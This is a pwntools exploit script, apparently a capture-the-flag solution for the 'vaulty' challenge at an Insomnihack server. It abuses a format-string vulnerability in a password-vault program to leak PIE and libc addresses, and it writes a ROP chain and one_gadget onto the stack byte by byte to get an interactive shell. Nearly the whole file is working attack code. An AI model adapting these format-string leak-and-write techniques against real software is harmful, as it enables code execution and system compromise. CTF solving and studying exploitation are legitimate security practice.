from pwn import *

context.bits =64

e = ELF('./vaulty_patched')
#p = process(e.path)
p = remote('vaulty.insomnihack.ch', 4556)
libc = ELF('libc6_2.35.so')


program = e.path#pwnlib.data.elf.fmtstr.get('i386')
def exec_fmt(payload):
    p = process(program)
    p.sendlineafter('Enter your choice (1-5):', '1')
    p.sendlineafter('Username:',payload)
    p.sendlineafter('Password:','A')
    p.sendlineafter('URL:','A')
    p.sendlineafter('Enter your choice (1-5):', '4')
    p.sendlineafter('Select an entry to view (0-0):','0')
    print(p.recvline())
    junk = p.recvuntil('Username: ')
    return p.recvline()

#autofmt = FmtStr(exec_fmt)
#offset = autofmt.offset #16
#print('Offset: ', offset)
#exit()
p.sendlineafter('Enter your choice (1-5):', '1')
p.sendlineafter('Username:','%13$llx')
p.sendlineafter('Password:','A')
p.sendlineafter('URL:','A')
p.sendlineafter('Enter your choice (1-5):', '4')
p.sendlineafter('Select an entry to view (0-0):','0')
p.recvline()
p.recvuntil(b'Username: ')
addr = int(p.recvline().strip(),16)
print(hex(addr))
pie = addr - 0x1984
print('pie='+hex(pie))

puts = pie + e.got['puts']
putchar = pie + e.got['putchar']

print(hex(puts))
print(hex(putchar))

tries = 1
offset = 12


p.sendlineafter(b'Enter your choice (1-5):', b'1')
p.sendlineafter(b'Username:',p64(puts))
p.sendlineafter(b'Password:',f'%{16+tries*offset}$s')
p.sendlineafter(b'URL:',b'A')
p.sendlineafter(b'Enter your choice (1-5):', b'4')
p.sendlineafter(b':',str(tries))
p.recvline()
p.recvuntil(b'Username: ')
junk = p.recvuntil(b'Password: ')
leak = u64(p.recvline().strip().ljust(8,b'\x00'))
print('Puts:'+hex(leak))

tries+=1


libc.address = leak - libc.symbols['puts']
print('libc:'+hex(libc.address))

one_gadget = libc.address + 0xebd43

print('one_gadget:'+hex(one_gadget))

p.sendlineafter(b'Enter your choice (1-5):', b'2')
p.sendlineafter(b'):','0')
p.sendlineafter(b'Username:','%12$llx')
p.sendlineafter(b'Password:','A')
p.sendlineafter(b'URL:',b'A')
p.sendlineafter(b'Enter your choice (1-5):', b'4')
p.sendlineafter(b':','0')

print(p.recvuntil(b'Username: '))
base_pointer = int(p.recvline().strip(),16)

print('base_pointer:'+hex(base_pointer))


def write_byte(address,payload):
    p.sendlineafter(b'Enter your choice (1-5):', b'2')
    p.sendlineafter(b'):','0')
    p.sendlineafter(b'Username:',p64(address))
    p.sendlineafter(b'Password:',f'%{payload}c%16$hhn')
    p.sendlineafter(b'URL:',b'A')
    p.sendlineafter(b'Enter your choice (1-5):', b'4')
    p.sendlineafter(b':','0')
    print(p.recvline())
    print(p.recvline())

for i in range(6):
    #take a byte from the base pointer
    write_byte(base_pointer+i,p64(base_pointer)[i])

xor_rax = libc.address + 0xbaaf9 #xor rax, rax; ret;
pop_r13 = libc.address + 0x37d88 #pop r13; ret;

for i in range(6):
    write_byte(base_pointer+8+i,p64(xor_rax)[i])

for i in range(6):
    write_byte(base_pointer+16+i,p64(one_gadget)[i])





ui.pause()
p.interactive()


exit()
p = process(program, stderr=PIPE)
addr = unpack(p.recv(4))
payload = fmtstr_payload(offset, {addr: 0x1337babe})
p.sendline(payload)
print(hex(unpack(p.recv(4))))
0x1337babe



p.interactive()